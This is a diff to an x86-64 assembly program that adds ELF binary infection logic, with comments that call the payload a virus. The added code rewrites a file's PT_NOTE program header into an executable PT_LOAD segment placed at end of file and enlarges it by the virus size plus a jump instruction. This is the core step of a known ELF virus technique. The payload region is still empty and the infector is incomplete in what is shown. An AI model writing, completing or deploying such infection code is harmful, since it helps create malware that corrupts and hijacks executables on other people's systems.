@@ -4,6 +4,11 @@ buffer resb 10000            ; 10KB buffer to load ELF file
 section .text
 global _start
 
+v_start:
+    
+v_stop:
+
+
 _start:
     ; -------- Parse command line arguments --------
     mov rdi, [rsp + 16]       ; argv[1] (path to ELF file)
@@ -62,10 +67,39 @@ phdr_not_found:
 
 pt_note_found:
     ; PT_NOTE segment found, rbx points to it
-    ; Add your logic to modify the segment or process it
-    mov rax, 60               ; sys_exit
-    xor rdi, rdi              ; Exit with code 0
-    syscall
+    
+    ; -------- Change the Segment Type --------
+    mov dword [rbx + 0x00], 0x1           ; Change p_type to PT_LOAD (1)
+
+    ; -------- Modify the Segment Flags --------
+    mov dword [rbx + 0x04], 0x5           ; Set p_flags to PF_X | PF_R (1 | 4)
+
+    ; -------- Set the File Offset --------
+    ; pop rax to retrieve the target EOF offset (previously pushed)
+    pop rax                              ; rax = target EOF offset
+    mov qword [rbx + 0x08], rax          ; Set p_offset = target EOF offset
+
+    ; -------- Calculate and Set Virtual Address --------
+    ; Load stat.st_size (file size) into r13
+    mov r13, [r15 + 48]                  ; r13 = stat.st_size
+    add r13, 0xc000000                   ; Add 0xc000000 (high memory address)
+    mov qword [rbx + 0x10], r13          ; Set p_vaddr = new virtual address
+
+    ; -------- Set Physical Address --------
+    mov qword [rbx + 0x18], r13          ; Set p_paddr = same as p_vaddr
+
+    ; -------- Adjust File Size --------
+    mov rax, v_stop - v_start + 5        ; Calculate virus size + 5 (jmp instruction)
+    add qword [rbx + 0x20], rax          ; Increase p_filesz by virus size + 5
+
+    ; -------- Adjust Memory Size --------
+    add qword [rbx + 0x28], rax          ; Increase p_memsz by virus size + 5
+
+    ; -------- Set Alignment --------
+    mov qword [rbx + 0x30], 0x200000     ; Set p_align = 2MB (0x200000)
+
+    ; -------- Return --------
+    ret
 
 exit_usage:
     mov rax, 60               ; sys_exit
